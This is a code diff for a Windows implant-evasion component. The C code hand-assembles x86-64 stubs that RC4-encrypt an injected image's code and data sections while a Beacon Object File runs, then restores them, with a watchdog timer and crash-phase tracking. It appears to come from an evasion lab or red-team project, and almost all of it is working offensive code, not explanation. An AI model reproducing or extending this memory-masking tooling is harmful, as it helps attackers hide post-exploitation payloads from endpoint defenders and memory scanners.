@@ -103,9 +103,18 @@ typedef struct {
 	                                       * the epilogue (bypasses every VEH) */
 	BOOL (WINAPI  * pVirtualProtect)(void *, SIZE_T, DWORD, DWORD *); /* +0x88 */
 	BOOL (WINAPI  * pFlushIC)(void *, const void *, SIZE_T);          /* +0x90 */
-	volatile LONG   phase;                /* +0x98 crash forensics: 1=VP done
-	                                       * 2=masked 3=BOF done 4=exit back  */
+	volatile LONG   phase;                /* +0x98 crash forensics: 1=enter VP
+	                                       * done 2=mask loop done 3=exit won
+	                                       * 4=back in C 5=wd_rest 6=prots done
+	                                       * 7=timer gone 8=wiped 10+i=C mask
+	                                       * block i 40+i=C restore block i
+	                                       * 60+i=watchdog restore block i    */
 	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];      /* +0xA0 */
+	unsigned char   sbox0[256];           /* KSA(key,ctr=text_idx) - pristine;
+	                                       * the stub-side PRGA mutates sbox1,
+	                                       * so exit/watchdog rep-movsq the
+	                                       * fresh state back before unmasking */
+	unsigned char   sbox1[256];           /* PRGA working copy                */
 } BW_CTX;
 
 volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */
@@ -120,7 +129,10 @@ static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 #define BW_ENTER_OFF 0x000
 #define BW_EXIT_OFF  0x080
 #define BW_WATCH_OFF 0x110
-#define BW_CTXQ_OFF  0x190   /* after the watchdog tail-jump data qword */
+#define BW_CTXQ_OFF  0x1B0   /* qword: ctx page address (rip-relative for stubs) */
+#define BW_SB0Q_OFF  0x1B8   /* qword: ctx->sbox0 address */
+#define BW_SB1Q_OFF  0x1C0   /* qword: ctx->sbox1 address */
+#define BW_RC4_OFF   0x1C8   /* page-local RC4 PRGA (see below) */
 
 /* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
  * round-tripping a block under a DIFFERENT counter would corrupt it. */
@@ -148,6 +160,30 @@ static void bw_rc4(BW_SF032 fn, unsigned char * buf, unsigned long len,
 	work[1] = 0;
 }
 
+/* KSA for the stub-side PRGA: identical stream to bw_rc4(key, ctr) - the
+ * ctr-variant bytes are xored in here so the page code only walks the
+ * permutation. Runs at window setup, plaintext image, so a plain stack
+ * array (and its /GS cookie) is fine here - unlike bw_rc4. */
+static void bw_kasa(unsigned char * sbox, const unsigned char * key, unsigned int ctr)
+{
+	unsigned char k2[16];
+	unsigned char t;
+	int i, j = 0;
+
+	memcpy(k2, key, 16);
+	k2[0] ^= (unsigned char)ctr;
+	k2[1] ^= (unsigned char)(ctr >> 8);
+	for (i = 0; i < 256; i++)
+		sbox[i] = (unsigned char)i;
+	for (i = 0; i < 256; i++) {
+		j = (j + sbox[i] + k2[i & 15]) & 255;
+		t = sbox[i];
+		sbox[i] = sbox[j];
+		sbox[j] = t;
+	}
+	memset(k2, 0, 16);
+}
+
 /* section protection with guard/noaccess rejection. The original
  * protection is returned through *prot for the post-unmask restore: .text
  * is RX in the injected image and the RC4 pass needs RW, so the window
@@ -171,19 +207,22 @@ static BOOL bw_page_usable(void * p, DWORD * prot)
 	return TRUE;
 }
 
-/* restore the recorded protections; plain C - only ever called from the
- * window teardown, after the exit stub put .text back (so IAT works) */
-	static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx)
-	{
-		int i;
-		DWORD old = 0;
-	
-		for (i = 0; i < n; i++) {
-			if (i == text_idx)
-				continue;
-			VirtualProtect(blocks[i].ptr, blocks[i].len, blocks[i].orig_prot, &old);
-		}
+/* restore the recorded protections via the CAPTURED VirtualProtect - the
+ * IAT lives in .rdata, which is on the mask list roadmap, so teardown must
+ * not depend on it; plain C - only ever called from the window teardown,
+ * after the exit stub put .text back */
+static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx,
+                              BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *))
+{
+	int i;
+	DWORD old = 0;
+
+	for (i = 0; i < n; i++) {
+		if (i == text_idx)
+			continue;
+		pVP(blocks[i].ptr, blocks[i].len, blocks[i].orig_prot, &old);
 	}
+}
 
 	/* After the mask loop, .data/.rdata (and the IAT) are ciphertext. MSVC /O1
 	 * turned `enter = g_bw_stubs + OFF; enter();` into `call [g_bw_stubs]`
@@ -238,57 +277,60 @@ static int bw_snapshot(BW_BLOCK * out, int max, void * image, int * text_idx)
 
 /* ---- hand-assembled transition stubs (gate-stub technique) ----
  *
- * Page layout (byte offsets; the ctx qword and the watchdog tail-jump
+ * Page layout (byte offsets; ctx/sbox qwords and the watchdog tail-jump
  * target are patched at build time):
- *   0x000 enter_stub
- *   0x040 exit_stub
- *   0x080 watchdog_stub
- *   0x0C0 qword: ctx page address (rip-relative source for all three)
+ *   0x000 enter_stub   (cap 0x80)
+ *   0x080 exit_stub    (cap 0x90)
+ *   0x110 watchdog_stub(cap 0xA0)
+ *   0x1B0 qword: ctx page address (rip-relative source for all three)
+ *   0x1B8 qword: ctx->sbox0 address
+ *   0x1C0 qword: ctx->sbox1 address
+ *   0x1C8 rc4_prga: page-local RC4 PRGA
+ *
+ * The stubs NEVER call SystemFunction032. Crash round 4 (live dump 952):
+ * enter's sf032(u_text, u_key) - the first stub-side CNG call, ~0x29000
+ * bytes of .text - died inside cryptsp->bcrypt->bcryptPrimitives with the
+ * key-import memcpy reading a garbage source (0x2000000000) passed down
+ * from the CNG stack frames. The same sf032 works fine for the small
+ * blocks from the C loop, so the CNG machinery is only reliable on the
+ * plain-C call shape. The page carries its own PRGA instead:
+ *
+ *   C setup: bw_kasa(ctx->sbox0, key, text_idx); memcpy(sbox1, sbox0)
+ *   enter:   VP(.text->RW); rc4_prga(.text)  <- masks (mutates sbox1)
+ *   exit:    rep movsq sbox1<-sbox0; rc4_prga(.text)  <- same stream, unmask
+ *   watch:   same as exit, then tail-jump the C rest-unmask
+ *
+ * rc4_prga (rcx=data, edx=len32; clobbers rax, r8-r11 only - no
+ * callee-saved regs, no stack, no calls, no alignment contract):
+ *   mov r10,[rip+sbox1q]; xor r8d,r8d; xor r9d,r9d        i=j=0
+ * L: test edx,edx; jz done
+ *   inc r8b                                                i=(i+1)&255
+ *   movzx r11d, byte [r10+r8]                              Si
+ *   add r9b, r11b                                          j=(j+Si)&255
+ *   movzx eax, byte [r10+r9]                               Sj
+ *   mov [r10+r8], al; mov [r10+r9], r11b                   swap
+ *   add al, r11b                                           t=(Si+Sj)&255
+ *   movzx eax, byte [r10+rax]                              K
+ *   xor [rcx], al; inc rcx; dec edx; jmp L
+ * done: ret
+ *
+ * The byte-register arithmetic (inc r8b / add r9b / add al) keeps every
+ * index <=255 by construction - and r8/r9/rax stay zero-extended because
+ * they were xor'd once and never written above the low byte.
  *
  * enter (called from C, rsp%16==8, [rsp]=ret_to_C):
- *   sub rsp,8              48 83 EC 08         -> 0
- *   mov r11,exit_imm64     49 BB ..            (page+0x040)
- *   push r11               41 53               -> 8, [rsp]=exit
- *   sub rsp,0x28           48 83 EC 28         -> 0 (32B shadow + 8 align)
- *   mov rax,[rip+ctx]      48 8B 05 d32
- *   lea rcx,[rax+0x50]     48 8D 48 50         u_text
- *   lea rdx,[rax+0x60]     48 8D 50 60         u_key
- *   call [rax+0x18]        FF 50 18            sf032: .text masked (last)
- *   add rsp,0x28           48 83 C4 28         -> 8
- *   mov rcx,[rax+0x28]     48 8B 48 28         args
- *   mov edx,[rax+0x30]     8B 50 30            alen
- *   jmp [rax+0x20]         FF 60 20            BOF entry (as-if-called)
+ *   sub rsp,0x28 / VP(.text->RW) / phase=1 / rc4_prga(.text)
+ *   mov r11,exit / push r11 (BOF rsp ==8 mod 16, [rsp]=exit)
+ *   rcx=args / edx=alen / jmp [ctx->entry]
  *
- * exit (BOF's ret lands here, rsp%16==0, [rsp]=ret_to_C):
- *   mov rax,[rip+ctx]      48 8B 05 d32
- *   mov ecx,2              B9 02 00 00 00
- *   xchg ecx,[rax]         87 08               claim the close atomically
- *   cmp ecx,1              83 F9 01
- *   jne skip               75 13               (19 bytes to skip)
- *   sub rsp,0x30           48 83 EC 30         -> 0 (entered at 0!)
- *   lea rcx,[rax+0x50]     48 8D 48 50
- *   lea rdx,[rax+0x60]     48 8D 50 60
- *   call [rax+0x18]        FF 50 18            .text restored
- *   add rsp,0x30           48 83 C4 30
- * skip:
- *   ret                    C3                  -> back into plaintext C
+ * exit (BOF ret lands here, rsp==0 mod 16, ret_to_C at [rsp+0x28]):
+ *   xchg-claim; loser jumps to tail. winner: sub rsp,0x20 / rep movsq
+ *   sbox1<-sbox0 / rc4_prga(.text) / VP(.text->text_prot) / FlushIC /
+ *   add rsp,0x20. tail: add rsp,0x28 / ret (pops ret_to_C)
  *
- * watchdog (timer callback, rsp%16==8, [rsp]=ret_dispatcher):
- *   mov rax,[rip+ctx]      48 8B 05 d32
- *   mov ecx,2              B9 02 00 00 00
- *   xchg ecx,[rax]         87 08
- *   cmp ecx,1              83 F9 01
- *   jne wd_ret             75 24               (36 bytes to the ret)
- *   sub rsp,0x28           48 83 EC 28         -> 0 (entered at 8)
- *   lea rcx,[rax+0x50]     48 8D 48 50
- *   lea rdx,[rax+0x60]     48 8D 50 60
- *   call [rax+0x18]        FF 50 18            .text restored mid-BOF
- *   add rsp,0x28           48 83 C4 28         -> 8
- *   mov rcx,rax            48 89 C1            ctx as first arg
- *   jmp [rip+0]            FF 25 00 00 00 00   tail-jump bw_watchdog_rest
- *   <qword &bw_watchdog_rest>                    (returns to dispatcher)
- * wd_ret:
- *   ret                    C3
+ * watchdog (timer callback, rsp%16==8): same claim; winner: sub rsp,0x28
+ *   (kept for the VP/flush calls later); sbox refresh; rc4_prga; VP; flush;
+ *   add rsp,0x28; tail-jmp bw_watchdog_rest (ret addr intact)
  */
 static unsigned char * bw_put32(unsigned char * p, long v)
 {
@@ -330,10 +372,12 @@ static void __stdcall bw_watchdog_rest(BW_CTX * ctx)
 
 	if (ctx == NULL || InterlockedExchange(&ctx->rest_done, 1) != 0)
 		return; /* the post-exit C path (or a prior watchdog) did it */
+	ctx->phase = 5;
 	InterlockedIncrement(&g_bw_watchdog_fires);
 	for (i = 0; i < ctx->nblocks; i++) {
 		if (i == ctx->text_idx)
 			continue;
+		ctx->phase = 60 + i;
 		bw_rc4(ctx->sf032, ctx->blocks[i].ptr, ctx->blocks[i].len,
 		       ctx->key2, ctx->key, (unsigned int)i);
 	}
@@ -341,6 +385,50 @@ static void __stdcall bw_watchdog_rest(BW_CTX * ctx)
 	 * blocks' protections are restored by the window teardown on the BOF
 	 * thread (bw_blocks_restore). The exit_stub sees state==CLOSED and
 	 * just rets. */
+}
+
+/* page-local RC4 PRGA - emitted verbatim at BW_RC4_OFF. The two rel8s and
+ * the rip-relative d32 are layout constants (fixed region offsets), and
+ * the mirror (evasion-lab/verify_bofwin_stub.py) byte-compares + emulates
+ * this stream against a reference RC4. */
+static const unsigned char BW_RC4_CODE[0x3B] = {
+	0x4C, 0x8B, 0x15, 0xF1, 0xFF, 0xFF, 0xFF,   /* +0x00 mov r10,[rip-0xF] -> sbox1q (4C: REX.R, 48 would load RDX) */
+	0x45, 0x31, 0xC0,                           /* +0x07 xor r8d,r8d   i=0 */
+	0x45, 0x31, 0xC9,                           /* +0x0A xor r9d,r9d   j=0 */
+	0x85, 0xD2,                                 /* +0x0D L: test edx,edx */
+	0x74, 0x29,                                 /* +0x0F jz done (0x3A) */
+	0x41, 0xFE, 0xC0,                           /* +0x11 inc r8b */
+	0x47, 0x0F, 0xB6, 0x1C, 0x02,               /* +0x14 movzx r11d,[r10+r8] */
+	0x45, 0x00, 0xD9,                           /* +0x19 add r9b,r11b */
+	0x43, 0x0F, 0xB6, 0x04, 0x0A,               /* +0x1C movzx eax,[r10+r9] */
+	0x43, 0x88, 0x04, 0x02,                     /* +0x21 mov [r10+r8],al */
+	0x47, 0x88, 0x1C, 0x0A,                     /* +0x25 mov [r10+r9],r11b */
+	0x44, 0x00, 0xD8,                           /* +0x29 add al,r11b */
+	0x41, 0x0F, 0xB6, 0x04, 0x02,               /* +0x2C movzx eax,[r10+rax] */
+	0x30, 0x01,                                 /* +0x31 xor [rcx],al */
+	0x48, 0xFF, 0xC1,                           /* +0x33 inc rcx */
+	0xFF, 0xCA,                                 /* +0x36 dec edx */
+	0xEB, 0xD3,                                 /* +0x38 jmp L (0x0D) */
+	0xC3,                                       /* +0x3A done: ret */
+};
+
+/* sbox1 <- sbox0: push rsi/rdi (callee-saved, rep movsq clobbers them),
+ * load both qwords rip-relatively, 0x40 qwords, pop. 26 bytes; the two
+ * d32s are computed by the caller: rel = qword_off - (R+9) / (R+16). */
+static int bw_emit_refresh(unsigned char * e, long d0, long d1)
+{
+	int n = 0;
+	e[n++] = 0x56;                                  /* push rsi */
+	e[n++] = 0x57;                                  /* push rdi */
+	e[n++] = 0x48; e[n++] = 0x8B; e[n++] = 0x35;    /* mov rsi,[rip+d0] */
+	memcpy(e + n, &d0, 4); n += 4;
+	e[n++] = 0x48; e[n++] = 0x8B; e[n++] = 0x3D;    /* mov rdi,[rip+d1] */
+	memcpy(e + n, &d1, 4); n += 4;
+	e[n++] = 0xB9; e[n++] = 0x40; e[n++] = 0x00; e[n++] = 0x00; e[n++] = 0x00; /* mov ecx,0x40 */
+	e[n++] = 0xF3; e[n++] = 0x48; e[n++] = 0xA5;    /* rep movsq */
+	e[n++] = 0x5F;                                  /* pop rdi */
+	e[n++] = 0x5E;                                  /* pop rsi */
+	return n;
 }
 
 static BOOL bw_build_pages(void)
@@ -362,182 +450,202 @@ static BOOL bw_build_pages(void)
 #define BW_BUILD_FAIL() do { 	VirtualFree(g_bw_ctx, 0, MEM_RELEASE);  g_bw_ctx = NULL; 	VirtualFree(g_bw_stubs, 0, MEM_RELEASE); g_bw_stubs = NULL; 	return FALSE; } while (0)
 
 	/* ---- enter_stub (called from C, rsp%16==8, [rsp]=ret_to_C) ----
-	 * Stack contract (the first two builds were off by 8: push must land
-	 * exit DIRECTLY in [ret-8], the slot the BOF's ret will pop, and the
-	 * call-alignment pad must match - sub 0x20 after the push, not 0x28
-	 * after a bogus sub 8):
-	 *   push r11(exit)                [ret-8]=exit, rsp%16 -> 0
-	 *   sub rsp,0x20                  rsp%16==0 for the calls below
-	 *   mov rax,[rip+ctx]
-	 *   VirtualProtect(u_text.buf, len32, PAGE_RW, &ctx->vp_old)
-	 *   mov rax,[rip+ctx]             (rax volatile: reload per call group)
-	 *   sf032(u_text, u_key)          <- .text masked, executing the page
-	 *   mov rax,[rip+ctx]
-	 *   add rsp,0x20                  rsp = ret-8 ("call-entered" shape)
-	 *   jmp [ctx->entry]              entry's ret pops exit -> exit_stub;
-	 *                                 exit's ret pops [ret] -> this frame
-	 */
-	e = p + BW_ENTER_OFF;
-	e[0] = 0x49; e[1] = 0xBB;                                        /* mov r11, imm64 exit */
-	e = bw_put64(e + 2, (unsigned long long)(p + BW_EXIT_OFF));
-	e[0] = 0x41; e[1] = 0x53;                                        /* push r11 */
-	e += 2;
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x20;            /* sub rsp,0x20 */
-	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
-	e += 4;
-	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
-	e += 3;
-	e[0] = 0x41; e[1] = 0xB8; e[2] = 0x04; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov r8d,PAGE_RW */
-	e += 6;
-	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
-	e += 4;
+	 * Stack contract (round-5 rewrite): the BOF must be entered EXACTLY
+	 * as a real call would - rsp%16==8, [rsp]=exit, and ret_to_C one slot
+	 * ABOVE the BOF's 32-byte shadow so a compiled BOF can never scratch
+	 * it. sub 0x28 first (align+shadow for the VP call), all calls, THEN
+	 * push exit (nothing after it touches the stack), jmp entry:
+	 *   entry rsp=S-8:  sub 0x28 -> S-0x30 (calls happen here)
+	 *   push exit       -> S-0x38 == BOF rsp ([rsp]=exit, ==8 mod 16)
+	 *   BOF shadow      = [S-0x30..S-0x18]  (inside the sub'd area)
+	 *   ret_to_C        = [S-8] = BOF rsp+0x30 (above the shadow)
+	 *   BOF ret -> exit at rsp=S-0x30 (==0 mod 16: exit's sub 0x20 aligns
+	 *   its VP/flush calls and provides their shadow) */
+	{
+		e = p + BW_ENTER_OFF;
+		e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
+		e += 4;
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] ctx */
+		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
+		e += 4;
+		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
+		e += 3;
+		e[0] = 0x41; e[1] = 0xB8; e[2] = 0x04; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov r8d,PAGE_RW */
+		e += 6;
+		e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
+		e += 4;
 		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x88] VP */
 		e += 6;
 		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
 		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-		e[0] = 0xC7; e[1] = 0x80; e[2] = 0x98; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov dword [rax+0x98],1 (disp32: 0x98 is not a signed disp8) */
+		e[0] = 0xC7; e[1] = 0x80; e[2] = 0x98; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* phase=1 (disp32) */
 		e[6] = 0x01; e[7] = 0x00; e[8] = 0x00; e[9] = 0x00;
 		e += 10;
-	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
-	e += 4;
-	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
-	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
-	e += 3;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x20;            /* add rsp,0x20 */
-	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x28;            /* mov rcx,[rax+0x28] args */
-	e += 4;
-	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x30;                          /* mov edx,[rax+0x30] alen */
-	e += 3;
-	e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] entry */
-	e += 3;
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = u_text.buf */
+		e += 4;
+		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = u_text.len32 */
+		e += 3;
+		e[0] = 0xE8;                                                     /* call rc4_prga */
+		e = bw_put32(e + 1, BW_RC4_OFF - (int)(e - p) - 5);
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+		e[0] = 0x49; e[1] = 0xBB;                                        /* mov r11, imm64 exit */
+		e = bw_put64(e + 2, (unsigned long long)(p + BW_EXIT_OFF));
+		e[0] = 0x41; e[1] = 0x53;                                        /* push r11: BOF's [rsp] */
+		e += 2;
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x28;            /* rcx = args */
+		e += 4;
+		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x30;                          /* edx = alen */
+		e += 3;
+		e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] entry */
+		e += 3;
 		if ((int)(e - (p + BW_ENTER_OFF)) > 0x80)
 			BW_BUILD_FAIL();
+	}
 
-	/* ---- exit_stub (BOF's ret lands here, rsp%16==0, .text=RW-cipher) ----
-	 * mov rax,[rip+ctx]; mov ecx,2; xchg ecx,[rax]; cmp ecx,1; jne ret
-	 * winner: sf032(.text plaintext) / reload / VP(.text->orig RX) /
-	 *         reload / FlushInstructionCache(-1, buf, len32)
-	 * ret  (loser path: the watchdog already restored everything)
-	 */
-	e = p + BW_EXIT_OFF;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-		e[0] = 0xC7; e[1] = 0x80; e[2] = 0x98; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov dword [rax+0x98],3 (disp32) */
+	/* ---- exit_stub (BOF ret lands here at rsp=S-0x30, %16==0) ----
+	 * phase=3; xchg-claim; loser jumps to the tail. winner: sub 0x20
+	 * (shadow + call alignment), refresh sbox1, rc4_prga unmasks .text,
+	 * VP back to text_prot, FlushIC, add 0x20. tail: add rsp,0x28; ret
+	 * pops ret_to_C at [S-8] (rsp+0x28 from exit entry). */
+	{
+		int jne_at, tail_at;
+		e = p + BW_EXIT_OFF;
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
+		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+		e[0] = 0xC7; e[1] = 0x80; e[2] = 0x98; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* phase=3 */
 		e[6] = 0x03; e[7] = 0x00; e[8] = 0x00; e[9] = 0x00;
 		e += 10;
-	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
-	e += 5;
-	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
-	e += 2;
-	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
-	e += 3;
-		e[0] = 0x75; e[1] = 0x46;                                        /* jne ret (+0x46) */
-	e += 2;
-	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
-	e += 4;
-	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
-	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
-	e += 3;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
-	e += 4;
-	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
-	e += 3;
-	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] orig */
-	e = bw_put32(e + 3, 0x74);
-	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
-	e += 4;
+		e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
+		e += 5;
+		e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
+		e += 2;
+		e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
+		e += 3;
+		jne_at = (int)(e - p);
+		e[0] = 0x0F; e[1] = 0x85;                                        /* jne rel32 tail (patched) */
+		e = bw_put32(e + 2, 0);
+		e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x20;            /* sub rsp,0x20 */
+		e += 4;
+		e += bw_emit_refresh(e, bw_disp((int)(e - p) + 9, BW_SB0Q_OFF),
+		                        bw_disp((int)(e - p) + 16, BW_SB1Q_OFF));
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = buf */
+		e += 4;
+		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = len32 */
+		e += 3;
+		e[0] = 0xE8;                                                     /* call rc4_prga */
+		e = bw_put32(e + 1, BW_RC4_OFF - (int)(e - p) - 5);
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = buf */
+		e += 4;
+		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = len32 */
+		e += 3;
+		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* r8d = [rax+0x74] orig */
+		e = bw_put32(e + 3, 0x74);
+		e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* r9 = &vp_old */
+		e += 4;
 		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x88] VP */
 		e += 6;
 		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
 		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-		e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
+		e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* rcx=-1 */
 		e += 7;
-		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] buf */
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* rdx = buf */
 		e += 4;
-		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x40; e[3] = 0x50;            /* mov r8d,[rax+0x50] len32 */
+		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x40; e[3] = 0x50;            /* r8d = len32 */
 		e += 4;
-		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x80; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x80] flush */
+		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x90; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x90] flush */
 		e += 6;
-		e[0] = 0xC3;                                                     /* ret */
+		e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x20;            /* add rsp,0x20 */
+		e += 4;
+		tail_at = (int)(e - p);
+		e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* tail: add rsp,0x28 */
+		e += 4;
+		e[0] = 0xC3;                                                     /* ret -> ret_to_C */
 		e += 1;
-	if ((int)(e - (p + BW_EXIT_OFF)) > 0x70)
-		BW_BUILD_FAIL();
+		bw_put32(p + jne_at + 2, tail_at - jne_at - 6);
+		if ((int)(e - (p + BW_EXIT_OFF)) > 0x90)
+			BW_BUILD_FAIL();
+	}
 
 	/* ---- watchdog_stub (timer callback, rsp%16==8; fires mid-BOF) ----
-	 * same claim+restore sequence (sub 0x28 for call alignment), then
-	 * reload + mov rcx,rax + tail-jump into the C rest-unmask.
-	 * wd_ret: ret
+	 * same claim+refresh+rc4+VP+flush (sub 0x28 first: alignment for the
+	 * VP/flush calls), then reload + mov rcx,rax + tail-jump into the C
+	 * rest-unmask. wd_ret: ret
 	 */
-	e = p + BW_WATCH_OFF;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
-	e += 5;
-	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
-	e += 2;
-	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
-	e += 3;
-		e[0] = 0x75; e[1] = 0x66;                                        /* jne wd_ret (+0x66) */
-	e += 2;
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
-	e += 4;
-	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
-	e += 4;
-	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
-	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
-	e += 3;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
